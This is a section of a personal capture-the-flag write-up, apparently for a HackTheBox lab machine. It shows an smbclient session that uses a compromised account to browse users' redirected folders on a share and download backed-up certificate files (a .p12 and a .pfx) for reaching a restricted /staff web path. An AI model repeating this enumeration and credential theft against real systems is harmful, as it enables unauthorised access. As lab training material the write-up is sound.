# 5 Enumerating Sierra.Frye folder in SMB share and downloading interesting files
```bash
~/Dropbox/Documents/htb/boxes/search ❯ smbclient -H \\\\10.10.11.129\\'RedirectedFolders$' -U 'Sierra.Frye'
Enter WORKGROUP\Sierra.Frye's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  Dc        0  Fri Feb 25 18:48:17 2022
  ..                                 Dc        0  Fri Feb 25 18:48:17 2022
  abril.suarez                       Dc        0  Tue Apr  7 23:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 18:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 17:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 23:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 17:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 23:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 18:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 17:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 23:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 16:55:34 2020
  edgar.jacobs                       Dc        0  Fri Apr 10 01:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 17:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 23:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 23:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 19:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 23:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 18:01:06 2020
  payton.harmon                      Dc        0  Fri Apr 10 01:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 16:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 23:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 17:21:42 2020
  sierra.frye                        Dc        0  Thu Nov 18 06:01:46 2021
  trace.ryan                         Dc        0  Fri Apr 10 01:14:26 2020

                3246079 blocks of size 4096. 594177 blocks available
smb: \> cd sierra.frye
smb: \sierra.frye\> ls
  .                                  Dc        0  Thu Nov 18 06:01:46 2021
  ..                                 Dc        0  Thu Nov 18 06:01:46 2021
  Desktop                           DRc        0  Thu Nov 18 06:08:00 2021
  Documents                         DRc        0  Fri Jul 31 19:42:19 2020
  Downloads                         DRc        0  Fri Jul 31 19:45:36 2020
  user.txt                           Ac       33  Thu Nov 18 05:55:27 2021

                3246079 blocks of size 4096. 594177 blocks available
smb: \sierra.frye\> cd Desktop
smb: \sierra.frye\Desktop\> ls
  .                                 DRc        0  Thu Nov 18 06:08:00 2021
  ..                                DRc        0  Thu Nov 18 06:08:00 2021
  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 23:03:59 2020
  desktop.ini                      AHSc      282  Fri Jul 31 19:42:15 2020
  Microsoft Edge.lnk                 Ac     1450  Tue Apr  7 17:28:05 2020
  user.txt                           Ac       33  Thu Nov 18 05:55:27 2021

                3246079 blocks of size 4096. 594177 blocks available
smb: \sierra.frye\Desktop\> cd ..
smb: \sierra.frye\> cd Documents
smb: \sierra.frye\Documents\> ls
  .                                 DRc        0  Fri Jul 31 19:42:19 2020
  ..                                DRc        0  Fri Jul 31 19:42:19 2020
  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 23:04:01 2020
  desktop.ini                      AHSc      402  Fri Jul 31 19:42:19 2020

                3246079 blocks of size 4096. 594177 blocks available
smb: \sierra.frye\Documents\> cd ..
smb: \sierra.frye\> cd Downloads
smb: \sierra.frye\Downloads\> ls
  .                                 DRc        0  Fri Jul 31 19:45:36 2020
  ..                                DRc        0  Fri Jul 31 19:45:36 2020
  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 23:04:01 2020
  Backups                           DHc        0  Tue Aug 11 01:39:17 2020
  desktop.ini                      AHSc      282  Fri Jul 31 19:42:18 2020

                3246079 blocks of size 4096. 594177 blocks available
smb: \sierra.frye\Downloads\> cd BAckups
smb: \sierra.frye\Downloads\BAckups\> ls
  .                                 DHc        0  Tue Aug 11 01:39:17 2020
  ..                                DHc        0  Tue Aug 11 01:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 20:04:11 2020
  staff.pfx                          Ac     4326  Tue Aug 11 01:39:17 2020

                3246079 blocks of size 4096. 594177 blocks available
smb: \sierra.frye\Downloads\BAckups\> get  search-RESEARCH-CA.p12
getting file \sierra.frye\Downloads\BAckups\search-RESEARCH-CA.p12 of size 2643 as search-RESEARCH-CA.p12 (5.6 KiloBytes/sec) (average 5.6 KiloBytes/sec)
smb: \sierra.frye\Downloads\BAckups\> get  staff.pfx
getting file \sierra.frye\Downloads\BAckups\staff.pfx of size 4326 as staff.pfx (9.2 KiloBytes/sec) (average 7.4 KiloBytes/sec)
smb: \sierra.frye\Downloads\BAckups\>
```
![[Pasted image 20220225235327.png]]
Found backups folder in `Sierra.Frye` directory which had `search-RESEARCH-CA.p12` and `staff.pfx`  and was downloaded to kali VM.
These `search-RESEARCH-CA.p12` and `staff.pfx` are actually certificates for browser to access `/staff` directory on http:1010.11.129/
 

